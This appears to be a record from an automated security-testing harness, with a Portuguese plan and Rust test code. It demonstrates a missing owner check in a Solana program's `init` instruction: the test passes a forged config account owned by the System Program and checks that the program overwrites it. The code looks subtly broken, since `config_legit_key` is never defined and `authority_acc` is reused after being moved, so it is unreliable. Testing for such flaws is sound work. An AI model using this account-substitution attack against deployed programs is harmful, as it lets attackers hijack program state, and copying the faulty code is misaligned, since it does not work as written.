attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) recebe `accounts[0]` como config e `accounts[1]` como authority, e grava dados em `accounts[0]` sem verificar o dono. O baseline usa uma conta config legitima (dono = program_id) e uma authority valida, provando que o cenario esta montado corretamente. O ataque repete a mesma instrucao, mas substitui a conta config por uma conta forjada cujo dono e outro programa (System Program), mantendo a mesma authority. O efeito medido e que a conta forjada foi aceita e teve seus dados sobrescritos pelo programa, demonstrando a falha de verificacao de owner.",
  "scenario": "let authority = Pubkey::new_unique();

// Conta config legitima: dono = program_id, dados zerados (nao inicializada)
let config_legit = account(&env.program_id, &[0u8; 49], None);

// Conta authority (apenas para o programa ler a chave)
let authority_acc = account(&env.program_id, &[], None);

// Baseline: init com conta config legitima
let ix_baseline = env.raw_ix(&[IX_INIT], &[
    AccountMeta::new(config_legit_key, true),
    AccountMeta::new_readonly(authority, false),
]);
let contas_baseline = vec![
    (config_legit_key, config_legit),
    (authority, authority_acc),
];
let r_base = env.baseline("init legitimo", &ix_baseline, &contas_baseline);

// Ataque: mesma instrucao, mas config forjada com dono diferente (System Program)
let config_forjada_key = Pubkey::new_unique();
let config_forjada = account(&solana_sdk::system_program::id(), &[0u8; 49], None);

let ix_attack = env.raw_ix(&[IX_INIT], &[
    AccountMeta::new(config_forjada_key, true),
    AccountMeta::new_readonly(authority, false),
]);
let contas_attack = vec![
    (config_forjada_key, config_forjada),
    (authority, authority_acc),
];
let r = env.attack("init com conta forjada de outro dono", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &config_forjada_key).data();
    env.effect("conta forjada aceita e sobrescrita com discriminador", data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8]);
    env.effect("conta forjada marcada como inicializada", data[40] == 1);
    env.effect("authority gravada na conta forjada", read_pubkey(data, 8) == authority);
}"
}

